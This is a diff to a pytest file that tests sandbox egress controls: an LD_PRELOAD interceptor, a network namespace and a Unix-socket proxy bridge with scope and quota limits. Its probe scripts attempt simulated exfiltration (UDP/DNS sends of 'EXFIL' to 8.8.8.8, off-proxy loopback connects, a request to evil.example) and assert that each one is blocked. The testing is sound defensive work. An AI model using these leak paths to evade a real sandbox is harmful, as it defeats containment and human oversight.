@@ -2,16 +2,21 @@
 redirect re-check / retry / model-vs-target classification). Pure decision logic and a
 loopback enforcement proxy against local HTTP fixtures — no real model needed."""
 import http.server
+import os
 import socket
 import sys
 import threading
 import urllib.parse
+from pathlib import Path
 
 import pytest
 
-from cairn.server.research_egress import (EgressProxy, QuotaState, UNSUPPORTED,
-                                          classify_scheme, parse_scope,
-                                          scope_decision)
+from cairn.server.research_egress import (EgressProxy, QuotaState, SANDBOX_PROXY_PORT,
+                                          UNSUPPORTED, build_egress_preload,
+                                          classify_scheme, inject_egress_bridge,
+                                          parse_scope, scope_decision,
+                                          stage_egress_bridge)
+from cairn.server.research_sandbox import build_sandbox
 
 
 class _Fixture(http.server.BaseHTTPRequestHandler):
@@ -220,51 +225,267 @@ def test_proxy_target_requests_tracked(fixture):
     finally:
         proxy.stop()
 
-def test_ld_preload_forces_direct_connect_through_proxy(tmp_path):
-    """#5 bypass-hardening: a direct socket.connect() to a NON-loopback host must be
-    forced through the enforcement proxy so it cannot reach the target directly, while
-    loopback stays usable. Proven with the proxy target unreachable: the direct connect
-    FAILS (ConnectionRefusedError) instead of reaching the host; and a loopback fixture
-    still connects. Skipped if no C compiler is available."""
+def test_ld_preload_blocks_udp_and_non_proxy_loopback(tmp_path):
+    """Direct TCP is forced through the proxy port. UDP/DNS and any other loopback
+    port are refused, so a target cannot exfiltrate over DNS or a host service.
+    Skipped if no C compiler is available."""
     import os
     import subprocess as sp
-    from cairn.server.research_egress import build_egress_preload
     so = build_egress_preload(tmp_path)
     if so is None:
         pytest.skip("no C compiler available to build the egress interceptor")
-    srv, host, port = _start_fixture()
+    dead = _grab_free_port()
+    proxy_srv = socket.socket()
+    proxy_srv.bind(("127.0.0.1", 0))
+    proxy_srv.listen(1)
+    proxy_port = proxy_srv.getsockname()[1]
+    other = socket.socket()
+    other.bind(("127.0.0.1", 0))
+    other.listen(1)
+    other_port = other.getsockname()[1]
+    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    udp.bind(("127.0.0.1", 0))
+    udp_port = udp.getsockname()[1]
+    udp.settimeout(0.4)
+    direct = (
+        "import socket\n"
+        "try:\n"
+        "    socket.create_connection(('10.255.255.1', 80), timeout=3)\n"
+        "    print('TCP_LEAK')\n"
+        "except Exception as e:\n"
+        "    print('TCP', type(e).__name__)\n"
+    )
+    local = (
+        "import socket\n"
+        f"s=socket.create_connection(('127.0.0.1', {proxy_port}), timeout=3)\n"
+        "print('PROXY_OK')\n"
+        "s.close()\n"
+        "try:\n"
+        f"    socket.create_connection(('127.0.0.1', {other_port}), timeout=3)\n"
+        "    print('LOOP_LEAK')\n"
+        "except Exception as e:\n"
+        "    print('LOOP', type(e).__name__)\n"
+        "u=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n"
+        "try:\n"
+        f"    u.sendto(b'EXFIL', ('127.0.0.1', {udp_port}))\n"
+        "    print('UDP_LEAK')\n"
+        "except Exception as e:\n"
+        "    print('UDP', type(e).__name__)\n"
+        "try:\n"
+        "    u.sendto(b'EXFIL', ('8.8.8.8', 53))\n"
+        "    print('DNS_LEAK')\n"
+        "except Exception as e:\n"
+        "    print('DNS', type(e).__name__)\n"
+        "try:\n"
+        "    u.sendmsg([b'EXFIL'], [], 0, ('8.8.8.8', 53))\n"
+        "    print('MSG_LEAK')\n"
+        "except Exception as e:\n"
+        "    print('MSG', type(e).__name__)\n"
+    )
     try:
-        dead = _grab_free_port()
-        # (A) direct connect to a NON-loopback host is forced through the proxy:
-        # with the proxy unreachable the connect cannot reach the host and fails.
-        code = (
-            "import socket\n"
-            "try:\n"
-            "    socket.create_connection(('10.255.255.1', 80), timeout=3)\n"
-            "    print('LEAK')\n"
-            "except Exception as e:\n"
-            "    print(type(e).__name__)\n"
-        )
-        env = dict(os.environ); env["LD_PRELOAD"] = so
-        env["CAIRN_EGRESS_PROXY"] = f"127.0.0.1:{dead}"
-        r = sp.run([sys.executable, "-c", code], capture_output=True, text=True,
-                   env=env, timeout=20)
-        assert "LEAK" not in r.stdout, (r.stdout, r.stderr)
-        assert "ConnectionRefusedError" in r.stdout, (r.stdout, r.stderr)
-        # (B) loopback is NOT intercepted, so the proxy itself and local fixtures
-        # remain reachable even with the interceptor loaded (no ConnectionRefused).
-        env2 = dict(os.environ); env2["LD_PRELOAD"] = so
-        env2["CAIRN_EGRESS_PROXY"] = f"127.0.0.1:{dead}"
-        code2 = (
-            "import socket\n"
-            f"s=socket.create_connection(('127.0.0.1', {port}), timeout=3)\n"
-            "print('LOOPBACK_OK')\n"
-        )
-        r2 = sp.run([sys.executable, "-c", code2], capture_output=True, text=True,
-                    env=env2, timeout=20)
-        assert "LOOPBACK_OK" in r2.stdout, (r2.stdout, r2.stderr)
+        dead_env = dict(os.environ)
+        dead_env["LD_PRELOAD"] = so
+        dead_env["CAIRN_EGRESS_PROXY"] = f"127.0.0.1:{dead}"
+        refused = sp.run([sys.executable, "-c", direct], capture_output=True, text=True,
+                         env=dead_env, timeout=20)
+        assert refused.returncode == 0, (refused.stdout, refused.stderr)
+        assert "TCP_LEAK" not in refused.stdout
+        assert "TCP ConnectionRefusedError" in refused.stdout, (refused.stdout, refused.stderr)
+        env = dict(os.environ)
+        env["LD_PRELOAD"] = so
+        env["CAIRN_EGRESS_PROXY"] = f"127.0.0.1:{proxy_port}"
+        r = sp.run([sys.executable, "-c", local], capture_output=True, text=True, env=env, timeout=20)
+        assert r.returncode == 0, (r.stdout, r.stderr)
+        assert "PROXY_OK" in r.stdout, (r.stdout, r.stderr)
+        assert "LOOP_LEAK" not in r.stdout
+        assert "LOOP ConnectionRefusedError" in r.stdout, (r.stdout, r.stderr)
+        assert "UDP_LEAK" not in r.stdout and "DNS_LEAK" not in r.stdout and "MSG_LEAK" not in r.stdout
+        assert "UDP PermissionError" in r.stdout, (r.stdout, r.stderr)
+        assert "DNS PermissionError" in r.stdout, (r.stdout, r.stderr)
+        assert "MSG PermissionError" in r.stdout, (r.stdout, r.stderr)
+        try:
+            udp.recvfrom(32)
+            raise AssertionError("UDP datagram reached the host")
+        except socket.timeout:
+            pass
     finally:
-        srv.shutdown(); srv.server_close()
+        proxy_srv.close()
+        other.close()
+        udp.close()
+
+
+def test_egress_bridge_socket_fits_sockaddr(tmp_path):
+    """A deep session directory must not make the Unix socket unbindable."""
+    deep = tmp_path
+    for i in range(8):
+        deep = deep / f"dir{i:02d}-session-private"
+    proxy = EgressProxy(allow=["http://127.0.0.1:9"], request_quota=1)
+    proxy.start()
+    try:
+        bridge = stage_egress_bridge(deep, proxy)
+        assert Path(proxy._unix_path).is_socket()
+        assert len(os.fsencode(proxy._unix_path)) < 108
+        assert (bridge / "host-socket").read_text().strip() == proxy._unix_path
+        client = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        client.settimeout(2)
+        client.connect(proxy._unix_path)
+        client.close()
+    finally:
+        proxy.stop()
+        assert proxy._unix_path is None
+
+
+def test_sandbox_command_does_not_share_host_network(tmp_path):
+    ws = tmp_path / "ws"
+    ws.mkdir()
+    cmd = build_sandbox(workspace=ws, repo=None, argv=["-c", "true"], claude_bin="sh")
+    assert "--unshare-all" in cmd
+    assert "--share-net" not in cmd
+
+
+def test_sandbox_blocks_udp_dns_and_host_loopback(tmp_path):
+    """Inside the research network namespace, host loopback and external UDP/DNS
+    are unreachable even without the preload library."""
+    import subprocess as sp
+    tcp = socket.socket()
+    tcp.bind(("127.0.0.1", 0))
+    tcp.listen(1)
+    tcp.settimeout(0.4)
+    tport = tcp.getsockname()[1]
+    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    udp.bind(("127.0.0.1", 0))
+    udp.settimeout(0.4)
+    uport = udp.getsockname()[1]
+    code = (
+        "import socket\n"
+        "try:\n"
+        f"    socket.create_connection(('127.0.0.1', {tport}), timeout=1)\n"
+        "    print('TCP_LEAK')\n"
+        "except OSError as e:\n"
+        "    print('TCP', type(e).__name__)\n"
+        "u=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n"
+        "try:\n"
+        f"    u.sendto(b'EXFIL', ('127.0.0.1', {uport}))\n"
+        "    print('UDP_LOCAL')\n"
+        "except OSError as e:\n"
+        "    print('UDP_LOCAL', e.errno)\n"
+        "try:\n"
+        "    u.sendto(b'EXFIL', ('8.8.8.8', 53))\n"
+        "    print('UDP_EXT_SENT')\n"
+        "except OSError as e:\n"
+        "    print('UDP_EXT', e.errno)\n"
+    )
+    ws = tmp_path / "ws"
+    ws.mkdir()
+    cmd = build_sandbox(workspace=ws, repo=None, argv=["-c", code], claude_bin="python3")
+    try:
+        result = sp.run(cmd, capture_output=True, text=True, timeout=30)
+        assert result.returncode == 0, (result.stdout, result.stderr)
+        assert "TCP_LEAK" not in result.stdout
+        assert "UDP_EXT_SENT" not in result.stdout
+        assert "UDP_EXT 101" in result.stdout, result.stdout
+        try:
+            udp.recvfrom(32)
+            raise AssertionError("sandbox UDP reached the host")
+        except socket.timeout:
+            pass
+        try:
+            tcp.accept()
+            raise AssertionError("sandbox TCP reached host loopback")
+        except socket.timeout:
+            pass
+    finally:
+        tcp.close()
+        udp.close()
+
+
+def test_sandbox_proxy_bridge_enforces_scope_and_quota(tmp_path):
+    """The Unix-socket bridge is the only exit. In-scope HTTP is counted; a second
+    request past the quota and an out-of-scope host are refused. UDP still cannot
+    leave the namespace."""
+    import subprocess as sp
+    srv, host, port = _start_fixture()
+    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    udp.bind(("127.0.0.1", 0))
+    udp.settimeout(0.4)
+    uport = udp.getsockname()[1]
+    decoy = socket.socket()
+    decoy.bind(("127.0.0.1", 0))
+    decoy.listen(1)
+    decoy.settimeout(0.4)
+    decoy_port = decoy.getsockname()[1]
+    proxy = EgressProxy(allow=[f"http://{host}:{port}"], request_quota=1)
+    proxy.start()
+    try:
+        bridge = stage_egress_bridge(tmp_path / "private", proxy)
+        so = build_egress_preload(tmp_path)
+        if so is not None:
+            (bridge / "libcairn_egress.so").write_bytes(Path(so).read_bytes())
+        probe = (
+            "import os, socket, urllib.request\n"
+            "print('PORT', os.environ.get('CAIRN_EGRESS_PORT'))\n"
+            "u=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n"
+            "try:\n"
+            f"    u.sendto(b'EXFIL', ('8.8.8.8', 53))\n"
+            "    print('UDP_EXT_SENT')\n"
+            "except OSError as e:\n"
+            "    print('UDP_EXT', e.errno)\n"
+            "try:\n"
+            f"    u.sendto(b'EXFIL', ('127.0.0.1', {uport}))\n"
+            "    print('UDP_LOCAL_SENT')\n"
+            "except OSError as e:\n"
+            "    print('UDP_LOCAL', e.errno)\n"
+            "try:\n"
+            f"    socket.create_connection(('127.0.0.1', {decoy_port}), timeout=1)\n"
+            "    print('DIRECT_LEAK')\n"
+            "except OSError:\n"
+            "    print('DIRECT_BLOCKED')\n"
+            "opener = urllib.request.build_opener(urllib.request.ProxyHandler({\n"
+            f"    'http': 'http://127.0.0.1:{SANDBOX_PROXY_PORT}',\n"
+            f"    'https': 'http://127.0.0.1:{SANDBOX_PROXY_PORT}',\n"
+            "}))\n"
+            "def hit(url):\n"
+            "    try:\n"
+            "        with opener.open(url, timeout=5) as resp:\n"
+            "            print('STATUS', resp.status)\n"
+            "    except urllib.error.HTTPError as e:\n"
+            "        print('STATUS', e.code)\n"
+            "    except Exception as e:\n"
+            "        print('ERR', type(e).__name__)\n"
+            "hit('http://evil.example:9/')\n"
+            f"hit('http://{host}:{port}/')\n"
+            f"hit('http://{host}:{port}/again')\n"
+        )
+        ws = tmp_path / "ws"
+        ws.mkdir()
+        cmd = build_sandbox(workspace=ws, repo=None, argv=["-c", probe], claude_bin="python3")
+        cmd = inject_egress_bridge(cmd, bridge)
+        if so is not None:
+            sep = cmd.index("--")
+            cmd[sep:sep] = ["--setenv", "LD_PRELOAD", "/cairn-egress/libcairn_egress.so"]
+        result = sp.run(cmd, capture_output=True, text=True, timeout=30)
+        assert result.returncode == 0, (result.stdout, result.stderr)
+        assert f"PORT {SANDBOX_PROXY_PORT}" in result.stdout, result.stdout
+        assert "UDP_EXT_SENT" not in result.stdout
+        assert "DIRECT_LEAK" not in result.stdout
+        assert "DIRECT_BLOCKED" in result.stdout, result.stdout
+        assert "STATUS 403" in result.stdout, result.stdout
+        assert "STATUS 200" in result.stdout, result.stdout
+        assert result.stdout.count("STATUS 403") >= 2, result.stdout
+        assert proxy.quota.requests == 1
+        assert proxy.stats["blocked"] >= 1
+        assert proxy.stats["quota_exhausted"] >= 1
+        try:
+            udp.recvfrom(32)
+            raise AssertionError("bridge sandbox delivered a UDP datagram to the host")
+        except socket.timeout:
+            pass
+    finally:
+        proxy.stop()
+        udp.close()
+        decoy.close()
+        srv.shutdown()
+        srv.server_close()
 
 
 def _grab_free_port():
